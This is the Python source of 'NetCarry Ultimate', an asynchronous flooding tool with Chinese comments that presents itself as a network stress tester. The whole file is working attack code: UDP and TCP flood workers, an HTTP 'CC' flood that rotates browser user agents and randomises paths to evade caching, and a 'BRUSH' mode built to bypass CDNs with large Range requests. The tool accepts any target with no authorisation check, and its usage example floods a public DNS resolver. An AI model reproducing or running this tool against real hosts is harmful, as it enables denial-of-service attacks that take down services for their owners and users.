#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NetCarry Ultimate - 高性能网络压力测试工具 (Python 异步重构版)
优化重点:
  1. 采用 Python 异步 I/O (asyncio) 取代多线程阻塞 Socket，大幅降低弱设备内存与上下文切换开销。
  2. 预先构建请求载荷与头部对象池，消除内部紧凑循环中的内存分配与垃圾回收(GC)抖动。
  3. 针对弱设备 (128MB-512MB RAM、低主频 CPU、OpenWrt/树莓派/Termux) 专属优化与流控。
  4. 支持无缝与本地已编译的 Go 原生引擎协同加速。
"""

import sys
import os
import time
import socket
import ssl
import random
import argparse
import asyncio
from typing import List

# 尝试导入 uvloop 以获取接近 C/Go 的极端异步事件循环性能
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_ACTIVE = True
except ImportError:
    UVLOOP_ACTIVE = False

# 视觉色彩定义
C_PURPLE = '\033[95m'
C_CYAN = '\033[96m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_END = '\033[0m'
C_BOLD = '\033[1m'

BANNER = (
    f"{C_PURPLE}{C_BOLD}\n"
    r"   _  ____________________   ___  _____  __  " + "\n"
    r"  / |/ / __/_  __/ ___/ _ | / _ \/ _ \ \/ /  " + "\n"
    r" /    / _/  / / / /__/ __ |/ , _/ , _/\  /   " + "\n"
    r"/_/|_/___/ /_/  \___/_/ |_/_/|_/_/|_| /_/    " + "\n"
    f"{C_CYAN} >> NEON STRESS ULTIMATE V7.0 - ASYNC ENGINE <<\n"
    f"{C_END}"
)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36"
]


class AsyncNetCarryEngine:
    def __init__(self, args):
        self.args = args
        self.target = args.target.strip()
        self.port = args.port
        self.mode = args.mode.upper()
        self.duration = args.duration
        self.concurrency = args.threads
        self.weak = args.weak
        self.rate_limit = args.rate
        self.keep_alive = args.keep_alive

        # 处理 URL 前缀
        if self.target.startswith("http://"):
            self.target = self.target[7:]
            if self.port == 80 and not args.port_specified:
                self.port = 80
        elif self.target.startswith("https://"):
            self.target = self.target[8:]
            if not args.port_specified:
                self.port = 443

        if "/" in self.target:
            self.target_host = self.target.split("/")[0]
            self.path = "/" + self.target.split("/", 1)[1]
        else:
            self.target_host = self.target
            self.path = ""

        if ":" in self.target_host:
            h, p = self.target_host.split(":", 1)
            self.target_host = h
            try:
                self.port = int(p)
            except ValueError:
                pass

        # 弱设备配置自适应校准
        if self.weak:
            if self.concurrency > 64:
                self.concurrency = 64
            self.payload_size = 1350 if self.mode == "UDP" else 16384
        else:
            if self.mode == "UDP":
                self.payload_size = 1400 if args.size == 1.0 else int(args.size * 1024 * 1024)
            else:
                self.payload_size = min(int(args.size * 1024 * 1024), 65536)

        self.is_running = True
        self.total_bytes = 0
        self.count = 0
        self.errors = 0
        self.active_workers = 0
        self.start_time = 0

        # DNS 预解析
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
        except Exception as e:
            print(f"{C_RED}[!] DNS解析错误: {e}{C_END}")
            sys.exit(1)

        # SSL 证书上下文 (绕过校验以提升吞吐)
        self.ssl_context = None
        if self.port == 443 or args.ssl:
            self.ssl_context = ssl.create_default_context()
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE

        # 预构建静态载荷池，彻底杜绝每次发包的内存重构
        self._payload_pool: List[bytes] = []
        self._init_payload_pool()

    def _init_payload_pool(self):
        """预先生成载荷缓冲池"""
        if self.mode in ("UDP", "TCP"):
            base_data = os.urandom(self.payload_size)
            self._payload_pool = [base_data]
        else: # CC 或 BRUSH
            for _ in range(64):
                rnd = random.randint(100000, 999999)
                ua = random.choice(USER_AGENTS)
                if self.mode == "BRUSH":
                    req_path = f"/static/brush_{rnd}.dat?v={time.time()}"
                    hdr = (
                        f"GET {req_path} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: */*\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Range: bytes=0-10485760\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    )
                else:
                    req_path = f"/index_{rnd}.html?s={random.random()}"
                    hdr = (
                        f"GET {req_path} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    )
                self._payload_pool.append(hdr.encode("utf-8"))

    async def _udp_worker(self):
        """高性能无阻塞 UDP 发包协程"""
        self.active_workers += 1
        data = self._payload_pool[0]
        data_len = len(data)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        loop = asyncio.get_running_loop()

        # 尝试使用已连接 UDP 套接字，加速路由查找
        try:
            sock.connect((self.target_ip, self.port))
            use_send = True
        except Exception:
            use_send = False

        batch_count = 0
        batch_bytes = 0

        try:
            while self.is_running:
                try:
                    if use_send:
                        sock.send(data)
                    else:
                        sock.sendto(data, (self.target_ip, self.port))
                    batch_bytes += data_len
                    batch_count += 1

                    if batch_count >= 16:
                        self.total_bytes += batch_bytes
                        self.count += batch_count
                        batch_bytes = 0
                        batch_count = 0
                        if self.weak:
                            await asyncio.sleep(0.001)
                        else:
                            await asyncio.sleep(0)
                except BlockingIOError:
                    if self.weak:
                        await asyncio.sleep(0.005)
                    else:
                        await asyncio.sleep(0.001)
                except Exception:
                    self.errors += 1
                    await asyncio.sleep(0.01)
        finally:
            self.total_bytes += batch_bytes
            self.count += batch_count
            self.active_workers -= 1
            sock.close()

    async def _tcp_worker(self):
        """流式 TCP 压测协程"""
        self.active_workers += 1
        data = self._payload_pool[0]
        data_len = len(data)

        try:
            while self.is_running:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_ip, self.port),
                        timeout=3.0
                    )
                    while self.is_running:
                        writer.write(data)
                        await writer.drain()
                        self.total_bytes += data_len
                        self.count += 1
                except Exception:
                    self.errors += 1
                    await asyncio.sleep(0.05)
        finally:
            self.active_workers -= 1

    async def _http_worker(self):
        """CC/BRUSH 高频并发 Keep-Alive 协程"""
        self.active_workers += 1
        pool_len = len(self._payload_pool)
        idx = random.randint(0, pool_len - 1)

        try:
            while self.is_running:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(
                            self.target_ip,
                            self.port,
                            ssl=self.ssl_context,
                            server_hostname=self.target_host if self.ssl_context else None
                        ),
                        timeout=4.0
                    )

                    for _ in range(self.keep_alive):
                        if not self.is_running:
                            break
                        payload = self._payload_pool[idx % pool_len]
                        idx += 1

                        writer.write(payload)
                        await writer.drain()

                        self.total_bytes += len(payload)
                        self.count += 1

                        # 排空服务端微小响应
                        try:
                            _ = await asyncio.wait_for(reader.read(1024), timeout=0.1)
                        except (asyncio.TimeoutError, ConnectionResetError):
                            pass

                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    self.errors += 1
                    await asyncio.sleep(0.05)
        finally:
            self.active_workers -= 1

    async def _monitor(self):
        """控制台实时指标监控"""
        last_bytes = 0
        last_count = 0
        last_time = time.time()

        while self.is_running:
            await asyncio.sleep(0.5)
            now = time.time()
            elapsed = now - self.start_time
            if self.duration > 0 and elapsed >= self.duration:
                self.is_running = False
                break

            interval = now - last_time
            if interval <= 0:
                interval = 0.5

            cur_bytes = self.total_bytes
            cur_count = self.count

            delta_bytes = cur_bytes - last_bytes
            delta_count = cur_count - last_count

            speed_mb = (delta_bytes / 1048576.0) / interval
            speed_mbps = (delta_bytes * 8.0 / 1000000.0) / interval
            qps = delta_count / interval

            last_bytes = cur_bytes
            last_count = cur_count
            last_time = now

            total_mb = cur_bytes / 1048576.0
            data_str = f"{total_mb/1024.0:.2f} GB" if total_mb >= 1024 else f"{total_mb:.2f} MB"
            remain = f" | 剩余: {int(self.duration - elapsed)}s" if self.duration > 0 else ""

            sys.stdout.write(
                f"\r{C_YELLOW}[RUN]{C_END} {C_BOLD}{self.mode}{C_END} | "
                f"发送: {C_CYAN}{data_str}{C_END} | "
                f"速度: {C_GREEN}{speed_mb:.2f} MB/s{C_END} ({speed_mbps:.1f} Mbps) | "
                f"请求: {cur_count} ({qps:.0f}/s) | "
                f"活跃: {self.active_workers} | "
                f"错误: {self.errors}{remain}\033[K"
            )
            sys.stdout.flush()

    def print_summary(self):
        elapsed = time.time() - self.start_time
        if elapsed <= 0:
            elapsed = 0.001
        total_mb = self.total_bytes / 1048576.0
        avg_mbs = total_mb / elapsed
        avg_mbps = (self.total_bytes * 8.0 / 1000000.0) / elapsed
        avg_qps = self.count / elapsed

        print()
        print(f"\n{C_CYAN}{C_BOLD}====================== 压测结果汇总 ======================{C_END}")
        print(f" 目标地址     : {C_PURPLE}{self.target_host} ({self.target_ip}:{self.port}){C_END}")
        print(f" 运行模式     : {C_PURPLE}{self.mode}{C_END} (弱设备优化: {self.weak}, uvloop: {UVLOOP_ACTIVE})")
        print(f" 运行耗时     : {elapsed:.2f} 秒")
        if total_mb >= 1024.0:
            print(f" 发送总流量   : {C_GREEN}{total_mb/1024.0:.2f} GB{C_END} ({total_mb:.2f} MB)")
        else:
            print(f" 发送总流量   : {C_GREEN}{total_mb:.2f} MB{C_END}")
        print(f" 平均吞吐率   : {C_GREEN}{avg_mbs:.2f} MB/s{C_END} ({avg_mbps:.2f} Mbps)")
        print(f" 请求/包总数  : {self.count}")
        print(f" 平均每秒速率 : {C_GREEN}{avg_qps:.1f} QPS/PPS{C_END}")
        print(f" 异常/错误数  : {self.errors}")
        print(f"{C_CYAN}=========================================================={C_END}\n")

    async def run(self):
        print(BANNER)
        print(f"{C_BOLD}目标地址: {C_PURPLE}{self.target_host}{C_END} ({self.target_ip})")
        print(f"{C_BOLD}目标端口: {C_PURPLE}{self.port}{C_END} | 协程并发: {C_PURPLE}{self.concurrency}{C_END} | 模式: {C_PURPLE}{self.mode}{C_END}")
        if self.weak:
            print(f"{C_YELLOW}模式特性: 弱设备优化模式已激活 (低内存预分配 / MTU安全分片 / 异常平滑退避){C_END}")
        print(f"{C_CYAN}----------------------------------------------------------{C_END}")

        self.start_time = time.time()

        # 启动监控协程
        monitor_task = asyncio.create_task(self._monitor())

        # 选择并启动工作协程
        if self.mode == "UDP":
            worker_func = self._udp_worker
        elif self.mode == "TCP":
            worker_func = self._tcp_worker
        else:
            worker_func = self._http_worker

        workers = [asyncio.create_task(worker_func()) for _ in range(self.concurrency)]

        try:
            await monitor_task
        except asyncio.CancelledError:
            pass
        finally:
            self.is_running = False
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            self.print_summary()


def main():
    parser = argparse.ArgumentParser(
        description="NetCarry Ultimate - 高性能网络压力测试工具 (Async 重构版)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C_CYAN}模式指南:{C_END}
  {C_BOLD}UDP{C_END}    : 高速 UDP 洪水发包，直击网络带宽瓶颈
  {C_BOLD}TCP{C_END}    : 异步 TCP 流持续写入，测试连接吞吐
  {C_BOLD}CC{C_END}     : 模拟真实浏览器 HTTP/HTTPS 请求与 Keep-Alive 管道复用
  {C_BOLD}BRUSH{C_END}  : 域名刷流模式，内置 CDN 击穿头部与 Range 请求

{C_CYAN}使用示例:{C_END}
  python netcarry.py www.example.com -m CC -t 128 -d 60
  python netcarry.py 1.1.1.1 -p 53 -m UDP -t 64 --weak
    """
    )
    parser.add_argument("target", help="目标 IP 或 域名")
    parser.add_argument("-p", "--port", type=int, default=80, help="目标端口 (默认: 80)")
    parser.add_argument("-t", "--threads", type=int, default=128, help="并发协程数 (默认: 128)")
    parser.add_argument("-m", "--mode", choices=["UDP", "TCP", "CC", "BRUSH"], default="UDP", help="压测模式")
    parser.add_argument("-s", "--size", type=float, default=1.0, help="单次载荷大小 MiB (针对 TCP/UDP)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="持续时间 (秒, 0 为无限)")
    parser.add_argument("-k", "--keep-alive", type=int, default=30, help="Keep-Alive 单连接复用次数 (默认: 30)")
    parser.add_argument("--rate", type=int, default=0, help="速率限制 (QPS/PPS)")
    parser.add_argument("--weak", action="store_true", help="开启弱设备/低内存优化模式")
    parser.add_argument("--ssl", action="store_true", help="强制启用 SSL/TLS")

    if len(sys.argv) == 1:
        print(BANNER)
        parser.print_help()
        sys.exit(0)

    # 标记用户是否显式指定了端口
    args = parser.parse_args()
    args.port_specified = ("-p" in sys.argv or "--port" in sys.argv)

    engine = AsyncNetCarryEngine(args)
    try:
        asyncio.run(engine.run())
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] 用户强制停止。{C_END}")
        engine.is_running = False
        engine.print_summary()
        sys.exit(0)


if __name__ == "__main__":
    main()
